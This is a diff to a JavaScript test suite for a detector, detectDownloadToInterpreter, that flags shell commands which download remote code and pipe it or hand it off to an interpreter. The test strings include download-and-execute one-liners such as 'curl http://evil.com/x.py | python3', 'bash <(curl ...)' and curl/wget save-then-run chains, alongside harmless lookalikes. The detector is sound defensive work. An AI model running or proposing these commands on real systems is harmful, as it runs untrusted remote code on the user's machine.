@@ -244,9 +244,71 @@ describe('评审回归：真实执行盲区补齐', () => {
     expect(risk.level).toBe('high');
   });
 
-  it('F11 硬边界：下载并执行直接命中', () => {
+  it('F11 硬边界：管道链上下载进解释器直接命中', () => {
     expect(detectDownloadToInterpreter('curl http://x | sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl http://x | tee /tmp/f | bash')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl http://evil.com/x.py | python3')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl http://evil.com/x.sh | env bash')).not.toBeNull();
     expect(detectDownloadToInterpreter('cat file.txt | grep x')).toBeNull();
+  });
+
+  it('F11 硬边界：下载落盘后执行同一文件（文件交接规则）', () => {
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && bash s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl -O http://x/s.sh && bash s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('wget -O s.py http://x/s.py && python s.py')).not.toBeNull();
+    // wget 无输出选项默认按 URL basename 落盘（下载执行最常见写法）
+    expect(detectDownloadToInterpreter('wget http://x/s.sh && bash s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl http://x/s.sh > s.sh && chmod +x s.sh && ./s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl http://x/s.sh | tee s.sh | grep ok && bash s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && source s.sh')).not.toBeNull();
+    // 短选项簇 / 长选项别名 / 粘连值
+    expect(detectDownloadToInterpreter('curl -sSLo s.sh http://x/s.sh && bash s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('wget -qO s.sh http://x/s.sh && bash s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl --remote-name http://x/s.sh && bash s.sh')).not.toBeNull();
+    // stdin 交接 / 内联载荷纯路径 / cmd
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && bash < s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && sh -c "./s.sh"')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl -o s.bat http://x/s.bat && cmd /c s.bat')).not.toBeNull();
+    // 带值选项 / wrapper（脚本位不固定为第一个非选项参数）
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && bash -O extglob s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && nice bash s.sh')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && timeout 5 bash s.sh')).not.toBeNull();
+    // 多个 -O 每个 URL 都落盘
+    expect(detectDownloadToInterpreter('curl -O http://x/a.sh -O http://x/b.sh && bash b.sh')).not.toBeNull();
+    // `python -m mod` 是模块文件执行（mod.py 落盘）——交接照拦；`node -e` 内联载荷不算
+    expect(detectDownloadToInterpreter('curl -o mod.py http://x/mod.py && python -m mod')).not.toBeNull();
+    expect(detectDownloadToInterpreter('curl -o x.txt http://x/x.txt && node -e "console.log(1)"')).toBeNull();
+    // 脚本位之后的 -c 是传给脚本的参数，不算内联——交接照拦
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && bash s.sh -c')).not.toBeNull();
+    // wget -o 是日志文件不影响内容落盘（默认落盘照旧）
+    expect(detectDownloadToInterpreter('wget -o fetch.log http://x/x.sh && bash x.sh')).not.toBeNull();
+  });
+
+  it('F11 硬边界：下载源进入解释器代码位（嵌入注入规则）', () => {
+    expect(detectDownloadToInterpreter('bash <(curl -s http://x/s.sh)')).not.toBeNull();
+    expect(detectDownloadToInterpreter('sh -c "$(curl -s http://x/s.sh)"')).not.toBeNull();
+    expect(detectDownloadToInterpreter('python3 -c "$(curl -s http://x/x.py)"')).not.toBeNull();
+    // 内联载荷内的 shell 文本递归走规则 1/2
+    expect(detectDownloadToInterpreter('bash -c "curl http://x | sh"')).not.toBeNull();
+    // 载荷内命令替换含下载源：保守拦（下载文本拼进代码位）
+    expect(detectDownloadToInterpreter('bash -c "echo $(curl http://x)"')).not.toBeNull();
+    // 非解释器的进程替换/命令替换是数据比较/输出，不是执行
+    expect(detectDownloadToInterpreter('diff <(curl http://x/a) <(curl http://x/b)')).toBeNull();
+    expect(detectDownloadToInterpreter('echo "$(curl http://x)"')).toBeNull();
+  });
+
+  it('F11 硬边界：仅共存不算数据流（下载+解释器组合命令不误杀）', () => {
+    expect(detectDownloadToInterpreter('curl -o data.csv http://x/data.csv && python analyze.py')).toBeNull();
+    expect(detectDownloadToInterpreter('curl -o pkg.tgz http://x/pkg.tgz && tar xzf pkg.tgz && bash build.sh')).toBeNull();
+    expect(detectDownloadToInterpreter('wget -O out.json http://x/out.json && node process.js')).toBeNull();
+    expect(detectDownloadToInterpreter('bash build.sh && curl -o artifact http://x/artifact')).toBeNull();
+    expect(detectDownloadToInterpreter('curl http://x | grep y | head -5 && node test.js')).toBeNull();
+    expect(detectDownloadToInterpreter('curl -o f http://x/f && jq . f')).toBeNull();
+    // 不同目录 / 大小写不同 = 不同文件（大小写敏感文件系统）
+    expect(detectDownloadToInterpreter('curl -o /tmp/a/run.sh http://x/run.sh && bash /tmp/b/run.sh')).toBeNull();
+    expect(detectDownloadToInterpreter('curl -o s.sh http://x/s.sh && bash S.sh')).toBeNull();
+    // 非载荷参数位的命令替换是数据，不是代码注入
+    expect(detectDownloadToInterpreter('bash build.sh $(curl http://x/version)')).toBeNull();
   });
 
   it('F11 硬边界：清盘命令位判定', () => {
